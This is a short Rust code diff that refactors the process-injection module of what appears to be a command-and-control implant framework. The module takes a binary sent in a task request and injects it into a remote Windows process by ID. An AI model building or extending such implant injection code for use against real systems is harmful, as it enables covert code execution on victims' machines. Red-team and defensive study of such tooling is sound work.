@@ -1,4 +1,5 @@
 use async_trait::async_trait;
+use malefic_helper::to_error;
 use malefic_proto::proto::implantpb::spite::Body;
 use malefic_trait::module_impl;
 use crate::{check_field, check_request, Input, Module, Output, TaskResult};
@@ -12,7 +13,7 @@ impl Module for Inject {
         let req = check_request!(receiver, Body::Inject)?;
 
         let bin = check_field!(req.bin)?;
-        malefic_helper::win::process::remote_inject(req.pid, &*bin)?;
+        to_error!(malefic_helper::win::inject::remote_inject(&*bin, req.pid))?;
 
         Ok(TaskResult::new(id))
     }
